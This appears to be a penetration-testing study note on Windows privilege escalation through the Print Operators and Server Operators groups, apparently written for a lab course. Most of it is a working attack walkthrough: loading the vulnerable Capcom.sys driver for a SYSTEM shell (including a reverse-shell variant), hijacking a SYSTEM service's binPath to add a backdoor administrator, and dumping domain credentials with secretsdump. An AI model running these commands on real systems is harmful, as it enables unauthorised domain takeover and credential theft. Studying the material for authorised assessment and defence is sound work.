# Print Operators & Server Operators — Windows PrivEsc

---

## Print Operators Group

### Privileges Granted
- **`SeLoadDriverPrivilege`** — load and unload device drivers (drivers run as highly privileged code)
- Manage, create, share, and delete printers connected to a DC
- Log on locally to a Domain Controller and shut it down

### Caveat — UAC
- `SeLoadDriverPrivilege` may not appear in an unelevated context.
- If missing: bypass UAC (see **UACMe** repo for comprehensive UAC bypass list), or open an elevated admin cmd and authenticate as the Print Operators group member.

```cmd
whoami /priv
# SeLoadDriverPrivilege  Disabled (if elevated but not exploited yet)
```

---

### Exploitation — Capcom.sys Vulnerable Driver

**Concept:** The driver `Capcom.sys` allows any user to execute shellcode with SYSTEM privileges. Use `SeLoadDriverPrivilege` to load it, then exploit it.

> ⚠️ **Note:** Since Windows 10 version 1803, `SeLoadDriverPrivilege` is no longer exploitable in this way — registry key references under `HKEY_CURRENT_USER` are no longer permitted for driver loading.

#### Manual Steps

**Step 1 — Compile the privilege-enabler tool**
Edit `EnableSeLoadDriverPrivilege.cpp` with the required includes, then compile from Visual Studio 2019 Developer Command Prompt:
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

**Step 2 — Add registry reference to the driver**
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
- `\??\` is an **NT Object Path** format — parsed/resolved by the Win32 API to load the driver.

**Step 3 — Verify driver is not yet loaded**
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
# (no results expected)
```

**Step 4 — Enable the privilege**
```cmd
EnableSeLoadDriverPrivilege.exe
# SeLoadDriverPrivilege: Enabled
```

**Step 5 — Verify Capcom is now loaded**
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
# Driver Name: Capcom.sys
```

**Step 6 — Exploit Capcom.sys for SYSTEM**
```powershell
.\ExploitCapcom.exe
# [+] Token stealing was successful
# [+] The SYSTEM shell was launched
```

#### No GUI Access (Reverse Shell Variant)
Modify `ExploitCapcom.cpp` line 292 — replace `cmd.exe` with your msfvenom reverse shell binary:
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
Recompile and execute; catch the connection on your listener.

#### Automated Alternative — EoPLoadDriver
Automates privilege enabling, registry key creation, and driver load in one step:
```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
Then run `ExploitCapcom.exe` as before.

#### Cleanup
```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

---

## Server Operators Group

### Privileges Granted
- **`SeBackupPrivilege`** and **`SeRestorePrivilege`**
- Full control over **local services** (including start/stop/reconfigure)
- Log on locally to servers, including **Domain Controllers**
- Does **not** grant Domain Admin, but effectively equivalent on DCs via service abuse

---

### Exploitation — Service Binary Path Hijacking

**Concept:** Server Operators have `SERVICE_ALL_ACCESS` over many services running as SYSTEM — use `sc config` to replace the binary path with a command that adds a backdoor local admin, then start the service to trigger it.

#### Step 1 — Identify a SYSTEM-context service
```cmd
sc qc AppReadiness
# SERVICE_START_NAME: LocalSystem
```

#### Step 2 — Confirm Server Operators have full control
```cmd
c:\Tools\PsService.exe security AppReadiness
# [ALLOW] BUILTIN\Server Operators  All
```

#### Step 3 — Check current local admin group (baseline)
```cmd
net localgroup Administrators
# Administrator, Domain Admins, Enterprise Admins (only)
```

#### Step 4 — Overwrite the service binary path
```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

#### Step 5 — Start the service (will fail — expected)
```cmd
sc start AppReadiness
# FAILED 1053: did not respond in timely fashion
```
- The failure is expected — the command still executes before the timeout.

#### Step 6 — Confirm local admin membership
```cmd
net localgroup Administrators
# server_adm now listed
```

MAKE SURE TO SIGNOUT AND SIGN BACK IN TO SEE CHANGES (if trying to access Administrator folder, try signing out)

#### Step 7 — Confirm full DC access
```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
# Pwn3d!
```

#### Step 8 — Dump domain credentials
```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
# Administrator:500:...:cf3a5525ee9414229e66279623ed5c58:::
```

---

## Key Takeaways

| Group | Core Danger | Exploitation Path |
|---|---|---|
| **Print Operators** | `SeLoadDriverPrivilege` | Load vulnerable Capcom.sys → SYSTEM (patched on Win10 1803+) |
| **Server Operators** | Full service control + local DC logon | Overwrite a SYSTEM service's binPath → add local admin → DC pwned |

Both groups are far more dangerous than they appear — treat discovery of either as equivalent to Domain Admin for practical purposes during an assessment.